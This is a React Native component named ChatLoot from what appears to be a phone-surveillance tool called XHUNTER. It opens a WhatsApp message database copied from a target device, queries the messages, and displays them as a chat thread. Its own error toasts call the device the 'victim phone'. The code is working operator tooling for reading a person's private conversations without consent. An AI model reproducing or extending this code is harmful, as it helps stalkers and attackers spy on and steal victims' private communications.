import React, { useEffect, useState } from "react";
import { Linking } from 'react-native';
import { 
    Box,
    StatusBar,
    HStack,
    IconButton,
    Icon,
    Text,
    useToast,
    Image,
    Pressable,
} from "native-base";
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import RNFetchBlob from 'rn-fetch-blob'
import { GiftedChat, Bubble, Day, Time, MessageImage } from 'react-native-gifted-chat';


import AppBuilder from '../../native-modules/AppBuilder'


const ChatLoot = ({navigation,route}) => {
  const { deviceId, id } = route.params;
  const toast = useToast();
  const [chat, setChat]=useState([])

  useEffect(()=>{
    fetchChatList();
  },[])

  const fetchChatList =()=>{
    const dirs = RNFetchBlob.fs.dirs;
    var path = dirs.SDCardDir +`/XHUNTER/${deviceId}/msgstore.db`;
    //var path = dirs.SDCardDir +`/msgstore.db`;
    var messageQuery=`SELECT messages.key_id, messages.key_remote_jid, messages.key_from_me AS isFromMe, messages.status, messages.data AS text, messages.timestamp AS createdAt, messages.media_url, messages.media_mime_type, messages.media_wa_type, messages.media_size, messages.media_name, messages.media_caption, messages.media_duration, messages.thumb_image AS image, messages.remote_resource, messages.raw_data, message_thumbnails.thumbnail, messages_quotes.key_id, messages_links._id FROM messages LEFT JOIN message_thumbnails on messages.key_id = message_thumbnails.key_id LEFT JOIN messages_quotes on messages.quoted_row_id > 0 AND messages.quoted_row_id = messages_quotes._id LEFT JOIN messages_links on messages._id = messages_links.message_row_id WHERE messages.key_remote_jid = '${id}' ORDER BY messages.timestamp asc`
    AppBuilder.readDB(path, messageQuery, (d)=>setChat(d));
   }

  const renderBubble = (props) => {
   const {currentMessage} =props;
   if(currentMessage.isFromMe==1&&!currentMessage.text&&!currentMessage.image)
   return;
   if(currentMessage.isFromMe==0&&!currentMessage.text&&!currentMessage.image)
   return;
    return ( 
        <Bubble {...props} 
            wrapperStyle={{right: { backgroundColor:"#ADD8E6" }}}
            textStyle={{right:{color:'#000'}}}
            position={currentMessage.isFromMe==1?"right":"left"} 
            renderTime={renderTime}
            renderMessageImage={renderMessageImage}
        />
    );}

    const scrollToBottomComponent = () => {
        return (  <Icon as={MaterialCommunityIcons} name="chevron-double-down" color={"tertiary.500"} />);
    }

    const renderAvatar =(props)=>{
        const {currentMessage} =props;
        if(currentMessage.isFromMe==1)
        return;
        if(currentMessage.isFromMe==0&&!currentMessage.text&&!currentMessage.image)
        return;
        return ( <Icon as={MaterialCommunityIcons} name="account-circle" color={"success.400"} />);
    }

    const renderTicks =(item)=>{
        if(item.isFromMe==0)
        return;
        return (<Icon as={MaterialCommunityIcons} name={"check-all"} color={"info.400"} size="4" mr="1"/>);
    }
    const renderDay = (props) => {
         let {currentMessage, previousMessage } =props;
         if(currentMessage.isFromMe==1&&!currentMessage.text&&!currentMessage.image)
         return;
         currentMessage={...currentMessage,createdAt: new Date(currentMessage.createdAt*1)}
         previousMessage={...previousMessage,createdAt: new Date(previousMessage.createdAt*1)}
         return (<Day {...props} currentMessage={currentMessage} previousMessage={previousMessage}/>)
      };
    const renderTime = (props) => {
        let {currentMessage } =props;
        currentMessage={...currentMessage,createdAt: new Date(currentMessage.createdAt*1)}
        return (<Time {...props} currentMessage={currentMessage} timeTextStyle={{right:{color:'#000'},left:{color:'#000'}}}/>)
     };
     const renderMessageImage = (props) => {
        let {currentMessage } =props;
        if(currentMessage.media_mime_type=="audio/ogg; codecs=opus"){
            return(
            <HStack my="4" px="4" alignItems="center" borderBottomWidth="1" borderBottomColor={'secondary.500'} >
            <IconButton 
              onPress={()=>toast.show({ title: "Unable to play audio", description:" You need to download the file manually from victim phone", status: "error", placement: "top"})}
              icon={<Icon as={MaterialCommunityIcons} name="play-circle-outline" />} 
              borderRadius="full" 
              _icon={{ color:  "tertiary.500", size: "sm"}} 
              _pressed={{ bg: "tertiary.800:alpha.20"}}            
              />
           <Text fontSize={'12'}  color={"black"}>Audio text message</Text>
        </HStack> )      
        }
        if(currentMessage.media_mime_type=="video/mp4"){
          return(
            <Pressable alignItems="center" justifyContent={'center'} >
              <Image source={{ uri: "data:image/jpeg;base64, " + currentMessage.thumbnail }} alt="Video" size="2xl" borderRightRadius={10} borderLeftRadius={10} />
            <IconButton 
              position={'absolute'}
              onPress={()=>toast.show({ title: "Unable to play video", description:" You need to download the file manually from victim phone", status: "error", placement: "top"})}
              icon={<Icon as={MaterialCommunityIcons} name="play-circle-outline" />} 
              borderRadius="full" 
              _icon={{ color:  "tertiary.500", size: "lg"}} 
              _pressed={{ bg: "tertiary.800:alpha.20"}}            
              />
        </Pressable> )    
        }
        currentMessage={...currentMessage,image: "data:image/jpeg;base64, "+currentMessage.thumbnail}
        return (<MessageImage {...props} currentMessage={currentMessage}/>)
     };
  
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop  bg={"primary"} />

    <Box flex={1} bg={"primary"} px={'2'} >
    <HStack my="4" alignItems="center" borderBottomWidth="1" borderBottomColor={'secondary.500'} >
      <IconButton 
         onPress={()=>navigation.goBack()}
         icon={<Icon as={MaterialCommunityIcons} name="chevron-left-circle" />} 
         borderRadius="full" 
         _icon={{ color:  "tertiary.500", size: "sm"}} 
         _pressed={{ bg: "tertiary.800:alpha.20"}}            
         />
        <Text pl={"30"} fontSize={'20'}  color={"secondary.500"}>+ {id.substr(0,id.lastIndexOf("@"))}</Text>
    </HStack>
    <GiftedChat
        messages={chat.map((chatMessage) => {
            let gcm = {
                ...chatMessage,
             _id: Math.round(Math.random() * 1000000),
             user: {
                _id: id,
                name: id.substr(0,id.lastIndexOf("@")),
                avatar: null
              },
            };
            return gcm;
          }).reverse()}//.reverse().slice(10,12)
          renderBubble={renderBubble}
          renderAvatar={renderAvatar}     
          parsePatterns={() => [
              { type: 'phone', style: { color: 'blue' }, onPress:(phoneNumber)=>Linking.openURL(`tel:${phoneNumber}`) },
              {type: 'url', style:  { color: 'blue', textDecorationLine: 'underline'}, onPress: (url)=>Linking.openURL(url)},
            ]}
        scrollToBottomComponent={scrollToBottomComponent}
        scrollToBottom
        renderTicks={renderTicks}
        minComposerHeight={0}
        maxComposerHeight={0}
        minInputToolbarHeight={0}
        renderInputToolbar={ () => null}
        renderDay={renderDay}
            />
    </Box>
    </>
    )
};

export default ChatLoot;
  